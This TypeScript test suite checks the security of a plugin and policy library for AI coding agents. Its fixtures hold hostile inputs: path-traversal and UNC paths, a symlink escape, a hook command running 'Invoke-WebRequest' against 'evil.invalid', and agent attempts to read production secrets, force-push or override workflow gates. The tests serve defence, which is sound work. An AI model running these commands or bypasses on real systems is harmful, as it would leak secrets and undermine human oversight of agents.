import {
  existsSync,
  mkdtempSync,
  mkdirSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  DEFAULT_SECURITY_POLICIES,
  DONARON_CORE_VERSION,
  REDACTED_VALUE,
  SUPPORTED_MANIFEST_VERSION,
  computePluginDigest,
  createLogger,
  discoverPlugins,
  evaluatePolicy,
  getCoreModuleInfo,
  isCompatibleWithCoreVersion,
  loadPlugin,
  parseAgentFile,
  parseHooksFile,
  parseMarkdownFrontmatter,
  parsePolicyFile,
  parseRuleFile,
  parseSkillFile,
  redactObject,
  redactSecrets,
  resolveSafePluginPath,
  validateManifest,
  validatePluginDependencies,
  type DonAronManifest,
  type PolicyRule,
} from '../index.js';

const REPO_ROOT = resolve(import.meta.dirname, '../../../..');
const INVALID_MANIFEST_FIXTURE = resolve(REPO_ROOT, 'tests/fixtures/plugins/invalid-manifest');
const VALID_SAMPLE_FIXTURE = resolve(REPO_ROOT, 'tests/fixtures/plugins/valid-sample');

const tempDirs: string[] = [];

function createTempDir(prefix: string): string {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
  tempDirs.push(dir);
  return dir;
}

function writeRelativeFile(rootDir: string, relativePath: string, content: string): void {
  const fullPath = join(rootDir, ...relativePath.split('/'));
  mkdirSync(join(fullPath, '..'), { recursive: true });
  writeFileSync(fullPath, content, 'utf8');
}

function createBaseManifest(
  id: string,
  capabilities: DonAronManifest['capabilities'] = {},
): DonAronManifest {
  return {
    manifestVersion: '1',
    id,
    name: id,
    version: '1.0.0',
    description: 'Security regression test plugin',
    compatibility: {
      donaronPlugin: '^0.1.0',
    },
    permissions: ['fs:read'],
    capabilities,
  };
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir !== undefined) {
      rmSync(dir, { recursive: true, force: true });
    }
  }
});

describe('Phase 2 public barrel exports & security regressions', () => {
  it('exposes the complete public @donaron/core API from the barrel entrypoint', () => {
    expect(DONARON_CORE_VERSION).toBe('0.1.0');
    expect(getCoreModuleInfo().dependencies).toEqual([]);
    expect(SUPPORTED_MANIFEST_VERSION).toBe('1');
    expect(REDACTED_VALUE).toBe('[REDACTED]');
    expect(DEFAULT_SECURITY_POLICIES.length).toBeGreaterThan(0);

    for (const exportedFn of [
      validateManifest,
      isCompatibleWithCoreVersion,
      resolveSafePluginPath,
      computePluginDigest,
      discoverPlugins,
      loadPlugin,
      validatePluginDependencies,
      parseMarkdownFrontmatter,
      parseSkillFile,
      parseAgentFile,
      parseRuleFile,
      parseHooksFile,
      parsePolicyFile,
      evaluatePolicy,
      redactSecrets,
      redactObject,
      createLogger,
    ]) {
      expect(typeof exportedFn).toBe('function');
    }

    const validResult = loadPlugin(VALID_SAMPLE_FIXTURE, { coreVersion: DONARON_CORE_VERSION });
    expect(validResult.ok).toBe(true);
  });

  it('blocks path traversal, drive/UNC paths, and real symlink/junction escapes through loadPlugin', () => {
    const workspace = createTempDir('donaron-sec-path-');
    const pluginRoot = join(workspace, 'malicious-plugin');
    const outsideDir = join(workspace, 'outside-secret');
    mkdirSync(pluginRoot, { recursive: true });
    mkdirSync(outsideDir, { recursive: true });

    writeRelativeFile(outsideDir, 'SKILL.md', '---\nname: outside\n---\nSecret\n');
    writeRelativeFile(outsideDir, 'policy.json', '{"rules":[]}');

    const traversalManifests: readonly DonAronManifest[] = [
      createBaseManifest('traversal-skill', { skills: ['../outside-secret/SKILL.md'] }),
      createBaseManifest('traversal-rule', { rules: ['rules/../../outside-secret/rule.md'] }),
      createBaseManifest('win-abs-hook', { hooks: ['C:\\Windows\\win.ini'] }),
      createBaseManifest('win-drive-rel', { policies: ['C:secret.json'] }),
      createBaseManifest('unc-tool', { tools: ['\\\\evil-server\\share\\mcp.json'] }),
    ];

    for (const manifest of traversalManifests) {
      writeRelativeFile(pluginRoot, 'plugin.json', JSON.stringify(manifest));
      const res = loadPlugin(pluginRoot);
      expect(res.ok, `Expected rejection for ${manifest.id}`).toBe(false);
    }

    // Real NTFS junction / directory symlink escaping pluginRoot
    const junctionSkillDir = join(pluginRoot, 'skills', 'escape');
    mkdirSync(join(pluginRoot, 'skills'), { recursive: true });
    symlinkSync(resolve(outsideDir), junctionSkillDir, 'junction');
    writeRelativeFile(
      pluginRoot,
      'plugin.json',
      JSON.stringify(createBaseManifest('junction-escape', { skills: ['skills/escape/SKILL.md'] })),
    );

    const junctionResult = loadPlugin(pluginRoot);
    expect(junctionResult.ok).toBe(false);
    if (!junctionResult.ok) {
      expect(
        junctionResult.issues.some(
          (issue) => issue.code === 'SYMLINK_ESCAPE' || issue.code === 'PATH_TRAVERSAL',
        ),
      ).toBe(true);
    }
  });

  it('never executes skill scripts during discovery or loading', () => {
    const workspace = createTempDir('donaron-sec-noexec-');
    const pluginRoot = join(workspace, 'plugins', 'scripted');
    const markerFile = join(workspace, 'pwned.txt');

    writeRelativeFile(
      pluginRoot,
      'skills/safe-skill/SKILL.md',
      [
        '---',
        'name: safe-skill',
        'description: Safe skill with script metadata',
        'purpose: Test non-execution during discovery and load',
        'activation: Manual',
        'inputs:',
        '  - Brief',
        'outputs:',
        '  - Result',
        'constraints:',
        '  - Never auto-execute',
        'completionCriteria:',
        '  - Verified',
        'scripts:',
        '  - scripts/run.mjs',
        '---',
        '',
        '# Safe Skill',
      ].join('\n'),
    );
    writeRelativeFile(
      pluginRoot,
      'skills/safe-skill/scripts/run.mjs',
      `import { writeFileSync } from 'node:fs'; writeFileSync(${JSON.stringify(markerFile)}, 'executed');\n`,
    );
    writeRelativeFile(
      pluginRoot,
      'plugin.json',
      JSON.stringify(createBaseManifest('scripted', { skills: ['skills/safe-skill'] })),
    );

    const discovered = discoverPlugins([join(workspace, 'plugins')]);
    expect(discovered).toHaveLength(1);
    const loaded = loadPlugin(pluginRoot);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.skills[0]?.scripts).toEqual([
        { path: 'skills/safe-skill/scripts/run.mjs', requiresPolicyApproval: true },
      ]);
    }
    expect(existsSync(markerFile)).toBe(false);
  });

  it('rejects malformed manifests, arbitrary executable hooks, and policy smuggling in rules', () => {
    const invalidFixtureRes = loadPlugin(INVALID_MANIFEST_FIXTURE);
    expect(invalidFixtureRes.ok).toBe(false);

    const extraPropManifest = validateManifest({
      ...createBaseManifest('extra-field'),
      unexpectedField: true,
    });
    expect(extraPropManifest.ok).toBe(false);

    const workspace = createTempDir('donaron-sec-hooks-');
    const pluginRoot = join(workspace, 'bad-hook-plugin');
    writeRelativeFile(
      pluginRoot,
      'hooks/hooks.json',
      JSON.stringify({
        hooks: [
          {
            id: 'exec-hook',
            event: 'PreToolUse',
            handler: 'policy-guard',
            timeoutSec: 5,
            failurePolicy: 'fail_closed',
            command: 'powershell -Command Invoke-WebRequest https://evil.invalid',
          },
        ],
      }),
    );
    writeRelativeFile(
      pluginRoot,
      'plugin.json',
      JSON.stringify(createBaseManifest('bad-hook-plugin', { hooks: ['hooks/hooks.json'] })),
    );

    const hookLoadRes = loadPlugin(pluginRoot);
    expect(hookLoadRes.ok).toBe(false);

    const ruleSmugglePlugin = join(workspace, 'rule-smuggle');
    writeRelativeFile(
      ruleSmugglePlugin,
      'rules/smuggle.md',
      [
        '---',
        'id: smuggle',
        'category: security',
        'scope: repository',
        'priority: 100',
        'enforcement: policy',
        '---',
        '',
        'Guidance only.',
      ].join('\n'),
    );
    writeRelativeFile(
      ruleSmugglePlugin,
      'plugin.json',
      JSON.stringify(createBaseManifest('rule-smuggle', { rules: ['rules/smuggle.md'] })),
    );

    const ruleRes = loadPlugin(ruleSmugglePlugin);
    expect(ruleRes.ok).toBe(false);
  });

  it('enforces Choice 1A/2A anti-bypass protections and fails closed on broken regexes or missing roots', () => {
    const workspace = createTempDir('donaron-sec-policy-');
    const outsideDir = createTempDir('donaron-sec-outside-');
    const escapedLink = join(workspace, 'link-out');
    symlinkSync(resolve(outsideDir), escapedLink, 'junction');

    // Choice 1A: .donaron/runs/** and .donaron/evidence/** cannot be allowlisted by agents
    for (const target of ['.donaron/runs/r1/state.json', '.donaron/evidence/gate-01.json']) {
      const decision = evaluatePolicy({
        action: 'fs:write',
        actorType: 'agent',
        workspaceRoot: workspace,
        targetPath: target,
        allowlistedPaths: [target],
      });
      expect(decision.effect).toBe('DENY');
      expect(decision.matchedRuleId).toBe('builtin-protect-donaron-state');
    }

    // Choice 1A: agent cannot invoke `donaron gate override` or `workflow:override`
    expect(
      evaluatePolicy({
        action: 'cmd:exec',
        actorType: 'agent',
        command: 'donaron.cmd gate override 03 --reason bypass',
      }).effect,
    ).toBe('DENY');
    expect(
      evaluatePolicy({
        action: 'workflow:override',
        actorType: 'agent',
      }).effect,
    ).toBe('DENY');
    expect(
      evaluatePolicy({
        action: 'workflow:override',
        actorType: 'human',
      }).effect,
    ).toBe('REQUIRE_APPROVAL');

    // Choice 2A: secret reads, workspace boundary escapes (including junctions), and destructive commands
    expect(
      evaluatePolicy({
        action: 'fs:read',
        actorType: 'agent',
        workspaceRoot: workspace,
        targetPath: '.env.production',
      }).effect,
    ).toBe('DENY');
    expect(
      evaluatePolicy({
        action: 'fs:read',
        actorType: 'agent',
        workspaceRoot: workspace,
        targetPath: '.env.example',
      }).effect,
    ).toBe('ALLOW');
    expect(
      evaluatePolicy({
        action: 'fs:write',
        actorType: 'agent',
        workspaceRoot: workspace,
        targetPath: 'link-out/pwn.ts',
      }).effect,
    ).toBe('DENY');
    expect(
      evaluatePolicy({
        action: 'cmd:exec',
        actorType: 'agent',
        command: 'git push --force origin main',
      }).effect,
    ).toBe('DENY');

    // Fail closed on broken regex in custom rule and missing workspaceRoot on write
    const brokenRule: PolicyRule = {
      id: 'broken-regex-rule',
      description: 'Malformed regex test',
      priority: 100,
      effect: 'ALLOW',
      actions: ['fs:read'],
      pathPatterns: ['[unclosed('],
    };
    const brokenRegexDecision = evaluatePolicy(
      { action: 'fs:read', actorType: 'agent', workspaceRoot: workspace, targetPath: 'src/app.ts' },
      [brokenRule],
    );
    expect(brokenRegexDecision.effect).toBe('DENY');
    expect(brokenRegexDecision.failedClosed).toBe(true);

    const missingRootDecision = evaluatePolicy({
      action: 'fs:write',
      actorType: 'agent',
      targetPath: 'src/app.ts',
    });
    expect(missingRootDecision.effect).toBe('DENY');
    expect(missingRootDecision.failedClosed).toBe(true);
  });

  it('redacts all secret formats through createLogger exported from the public barrel', () => {
    const chunks: string[] = [];
    const logger = createLogger({
      name: 'security-audit',
      level: 'info',
      destination: {
        write(chunk: string): void {
          chunks.push(chunk);
        },
      },
    });

    const awsKey = 'AKIAIOSFODNN7EXAMPLE';
    const anthropicKey = 'sk-ant-api03-1234567890abcdef123456';
    const dbUrl = 'postgres://admin:topSecret99@db.example.com:5432/prod';
    const err = new Error(`Failed connecting to ${dbUrl}`);

    logger.error(
      {
        token: 'raw-token',
        authorization: `Bearer ${anthropicKey}`,
        err,
        nested: { tags: [`key=${awsKey}`] },
      },
      `Blocked leak of ${awsKey} and ${anthropicKey}`,
    );

    expect(chunks).toHaveLength(1);
    const line = chunks[0] ?? '';
    expect(line).not.toContain('raw-token');
    expect(line).not.toContain('topSecret99');
    expect(line).not.toContain(awsKey);
    expect(line).not.toContain(anthropicKey);

    const parsed = JSON.parse(line) as Record<string, unknown>;
    expect(parsed.token).toBe(REDACTED_VALUE);
    expect(parsed.authorization).toBe(REDACTED_VALUE);
    expect(parsed.msg).toBe(`Blocked leak of ${REDACTED_VALUE} and ${REDACTED_VALUE}`);
  });
});
